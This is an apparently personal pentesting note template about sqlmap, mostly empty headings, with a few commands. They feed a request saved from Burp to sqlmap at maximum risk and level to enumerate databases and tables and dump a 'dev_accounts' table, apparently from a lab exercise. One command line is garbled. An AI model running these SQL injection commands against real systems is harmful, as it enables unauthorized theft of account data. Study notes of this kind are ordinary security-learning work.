---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[sqlmap]]  
___

## Description:


## Installation


## Commands

check certificate information


```
sqlmap -cannot use
```

Save the request from burp in the proxy tab by going to action, and then save item.

Then run sqlmap with the following (burp1 is the file saved from burp):
```

sqlmap -r burp1 --risk=3 --level=5 -databases --batch

sqlmap -r burp1 --risk=3 --level=5 -D gallery --tables --batch

sqlmap -r burp1 --risk=3 --level=5 -D gallery -T dev_accounts --dump --batch

```
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (12:22 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
